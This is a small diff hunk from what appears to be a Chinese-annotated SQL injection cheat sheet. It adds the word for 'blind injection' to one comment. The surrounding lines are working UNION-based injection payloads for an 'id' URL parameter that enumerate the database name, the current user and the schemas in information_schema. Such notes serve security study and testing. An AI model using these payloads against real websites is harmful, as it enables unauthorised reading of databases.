@@ -33,7 +33,7 @@
 ?id=1 and 1=1  
 ?id=1 order by 10  
 ?id=1 union select 1,2,3  
-// 获取数据库名，当前用户
+// 获取数据库名，当前用户盲注
 ?id=1 union select 1,database(),user()
 // 获取数据库名
 ?id=1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.SCHEMATA
